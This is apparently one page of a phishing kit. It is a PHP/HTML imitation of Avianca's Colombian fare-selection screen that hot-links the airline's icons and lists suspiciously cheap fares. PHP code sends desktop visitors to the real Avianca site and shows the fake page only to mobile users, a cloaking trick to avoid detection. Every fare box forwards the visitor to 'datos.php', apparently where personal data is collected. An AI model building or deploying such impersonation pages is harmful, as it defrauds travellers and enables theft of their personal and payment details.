<?php


function esDispositivoMovil() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $dispositivosMoviles = array(
        'Android', 'webOS', 'iPhone', 'iPad',
        'iPod', 'BlackBerry', 'Windows Phone'
    );

    foreach ($dispositivosMoviles as $dispositivo) {
        if (stripos($userAgent, $dispositivo) !== false) {
            return true;
        }
    }

    return false;
}

if (esDispositivoMovil()) {

} else {
    header('location:https://www.avianca.com/es/?poscode=CO&gad_source=1&gclid=Cj0KCQiAmNeqBhD4ARIsADsYfTf3M3CnHWAuPB5TJMPNHLxyBwgvsTEQ9E9ZtptQKnou4p8WNm3papAaAka8EALw_wcB');

}


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="/css/expanded.css">
</head>
<body>

<div class="viajes" id="miDiv">
    <h1 id="texto1">XS</h1>
   <center> <a id="texto2">Más económica</a><br></center>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/personalItemLowest-XS.svg" alt="" width="4%"><a id="texto3"> 1 Artículo personal (bolso) (debe caber bajo el asiento)</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/icon-alert-denied.svg" alt="" width="4%"><a id="texto4"> Resticciones de la tarifa</a>

    <br><input type="submit" id="texto5" value="Continuar sin servicios por $49.999">
</div>
<br>
<div class="viajes" style="height:140px;" id="miDiv">
    <h1 id="texto1" style="color:#f57c00;">S</h1>
   <center> <a id="texto2" style="color:#f57c00;">Más económica</a><br></center>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/carryOnBaggage-S.svg" alt="" width="4%"><a id="texto3"> 1 equipaje de mano (10 kg) + bolso</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/mileageAcrual-S.svg" alt="" width="4%"><a id="texto4"> Acumula LifeMiles</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/icon-alert-denied.svg" alt="" width="4%"><a id="texto4"> Resticciones de la tarifa</a>

    <br><input type="submit" id="texto5" style="background-color:#f57c00; color:white; border:none;" value="$65.500 Precio por pasajero">
</div>
<br>
<div class="viajes" style="height:229px; border:2px solid #f52800;" id="miDiv">
    <h1 id="texto1" style="color:#f52800; ">M</h1>
   <center> <a id="texto2" style="color:#f52800 ;">Más confort</a><br></center>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/carryOnBaggage-M.svg" alt="" width="4%"><a id="texto3"> 1 equipaje de mano (10 kg) + bolso</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/mileageAcrual-M.svg" alt="" width="4%"><a id="texto4"> Acumula LifeMiles</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/baggageAllowance-M.svg" alt="" width="4%"><a id="texto4"> 1 equipaje de bodega (23kg)</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/airportCheckin-M.svg" alt="" width="4%"><a id="texto4"> Check-in gratis en aeropuerto</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/standardSeat-M.svg" alt="" width="4%"><a id="texto4"> Asiento Economy</a>

    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/icon-alert-denied.svg" alt="" width="4%"><a id="texto4"> Resticciones de la tarifa</a>

    <br><input type="submit" style="background-color:#f52800; border:none; color:white" id="texto5" value="$85.999 Precio por pasajero">
</div>

<div class="viajes" style="height:245px;" id="miDiv">
    <h1 id="texto1" style="color:#e91e63;">L</h1>
   <center> <a id="texto2" style="color:#e91e63;">Más flexibilidad</a><br></center>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/carryOnBaggage-L.svg" alt="" width="4%"><a id="texto3"> 1 Artículo personal (bolso) (debe caber bajo el asiento)</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/mileageAcrual-L.svg" alt="" width="4%"><a id="texto4"> Acumula LifeMiles</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/baggageAllowance-L.svg" alt="" width="4%"><a id="texto4"> 1 equipaje de bodega (23 kg)</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/airportCheckin-L.svg" alt="" width="4%"><a id="texto4"> Check-in gratis en aeropuerto</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/aviancaPlusSeat-L.svg" alt="" width="4%"><a id="texto4"> Asiento Plus</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/itineraryChange-L.svg" alt="" width="4%"><a id="texto4"> Cambios de vuelo</a>
    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/reimbursement-L.svg" alt="" width="4%"><a id="texto4"> Reembolso</a>

    <br><img src="https://booking.avianca.com/statics/applications/booking/dist/2303.5.12/assets/icons/icon-alert-denied.svg" alt="" width="4%"><a id="texto4"> Resticciones de la tarifa</a>

    <br><input type="submit" id="texto5" style="background-color:#e91e63;color:white; border:none;" value="$104.545 Precio por pasajero">
</div>


<script>
    // Agrega la función de clic a todos los elementos con la clase 'viajes'
    var elementosViajes = document.getElementsByClassName('viajes');
    
    for (var i = 0; i < elementosViajes.length; i++) {
        elementosViajes[i].addEventListener('click', function() {
            window.location.href = 'datos.php';
        });
    }
</script>



    
</body>
</html>

<style>
    .footer{
    position: absolute;
    bottom: 0;
    background-color: white;
    font-size: 13px;
    width: 100%;
    height: 35px;
    align-items: center;
    color: gray;
}

</style>